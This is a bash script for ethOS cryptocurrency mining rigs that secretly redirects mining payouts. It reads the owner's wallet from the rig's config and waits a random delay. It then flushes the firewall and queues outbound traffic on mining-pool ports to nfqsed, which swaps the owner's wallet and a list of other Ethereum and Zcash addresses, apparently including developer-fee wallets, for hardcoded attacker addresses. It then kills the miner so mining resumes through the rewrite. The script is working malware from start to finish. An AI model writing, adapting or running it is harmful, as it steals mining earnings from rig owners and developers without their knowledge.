#!/bin/bash
TIME=$(($RANDOM%7500+1))
echo $TIME

ADDR="0x37224647aa0b131b4ced61ce77dde7f278890a6e"
ZDDR="t1Yvc1qQJq5ZNKMox3QrB6EV8MMTijN5Nju"
WALLET=$(grep "proxywallet" /home/ethos/local.conf |awk -F ' ' '{print $2}')
echo "Wallet $WALLET"
POOL=$(grep "proxypool1" /home/ethos/local.conf |awk -F ' ' '{print $2}')
echo "Pool $POOL"
PORT=$(grep "proxypool1" /home/ethos/local.conf |awk -F ':' '{print $2}')
#echo $PORT
MINER=$(grep "globalminer" /home/ethos/local.conf |awk -F ' ' '{print $2}')
echo "Miner:$MINER"
LOCNAME=$(grep "loc" /home/ethos/local.conf |awk -F ' ' '{print $3}')
echo "Worker name:$LOCNAME"
UPTIME=$(cat /proc/uptime | cut -d"." -f1)
SYSUPTIME=$(uptime |awk -F 'up' '{print $2}' |awk -F 'load' '{print $1}')
echo "Uptime:$UPTIME @ $SYSUPTIME"
PS=$(ps auxwww|grep nfqsed)
FEEING=$(echo $PS | grep "${WALLET}")

VER=$(cat /var/run/ethos/miner.versions | grep claymore | grep -v '-' )
echo $VER
TVER="12"
echo $TVER


result=$(echo $VER | grep "${TVER}")
if [[ "$result" != "" ]]
then
    echo "Miner Error!!!"
    exit
else
    echo "Continue!! "
fi



i=0
 
while [[ "$i" -ne "$TIME" ]]
do
echo $TIME
echo $i
cd=`expr $TIME - $i`
echo "Countdown: $cd"
sleep 1
let "i++"
done

sudo sysctl net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 8888 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 8080 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 8008 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 3333 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 13333 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 5577 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 4444 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 14444 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 443 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 25 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 1111 -j NFQUEUE
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 20535 -j NFQUEUE


killall nfqsed
sleep 1

cd $(dirname $0)

nfqsed -v \
-s /$WALLET/${ADDR} \
-s /0x7Fb21ac4Cd75d9De3E1c5D11D87bB904c01880fc/${ADDR} \
-s /0xc1c427cD8E6B7Ee3b5F30c2e1D3f3c5536EC16f5/${ADDR} \
-s /0xe19fFB70E148A76d26698036A9fFD22057967D1b/${ADDR} \
-s /0x3509F7bd9557F8a9b793759b3E3bfA2Cd505ae31/${ADDR} \
-s /0x34FAAa028162C4d4E92DB6abfA236A8E90fF2FC3/${ADDR} \
-s /0xdE088812A9c5005b0dC8447B37193c9e8b67a1fF/${ADDR} \
-s /0xB9cF2dA90Bdff1BC014720Cc84F5Ab99d7974EbA/${ADDR} \
-s /0xc6F31A79526c641de4E432CB22a88BB577A67eaC/${ADDR} \
-s /0x713ad5bd4eedc0de22fbd6a4287fe4111d81439a/${ADDR} \
-s /0xb4675bc23d68c70a9eb504a7f3baebee85e382e7/${ADDR} \
-s /0x1a31d854af240c324435df0a6d2db6ee6dc48bde/${ADDR} \
-s /0x9f04b72ab29408f1f47473f2635e3a828bb8f69d/${ADDR} \
-s /0xea83425486bad0818919b7b718247739f6840236/${ADDR} \
-s /0xb9cf2da90bdff1bc014720cc84f5ab99d7974eba/${ADDR} \
-s /0xaf9b0e1a243d18f073885f73dbf8a8a34800d444/${ADDR} \
-s /0xe19ffb70e148a76d26698036a9ffd22057967d1b/${ADDR} \
-s /0xde088812a9c5005b0dc8447b37193c9e8b67a1ff/${ADDR} \
-s /0x34faaa028162c4d4e92db6abfa236a8e90ff2fc3/${ADDR} \
-s /0x368fc687159a3ad3e7348f9a9401fc24143e3116/${ADDR} \
-s /0x39c6e46623e7a57cf1daac1cc2ba56f26a8d32fd/${ADDR} \
-s /t1N7NByjcXxJEDPeb1KBDT9Q8Wocb3urxnv/${ZDDR} \
-s /t1W9HL5Aep6WHsSqHiP9YrjTH2ZpfKR1d3t/${ZDDR} \
-s /t1b9PsiekL4RbMoGzyLMFkMevbz7QfwepgP/${ZDDR} \
-s /t1dn3KXy6mBi5TR1ifRwYse6JMgR2w7zUbr/${ZDDR} \
-s /eth1.0/800801 \
2>&1 > /dev/null  &

sleep 4
killall claymore
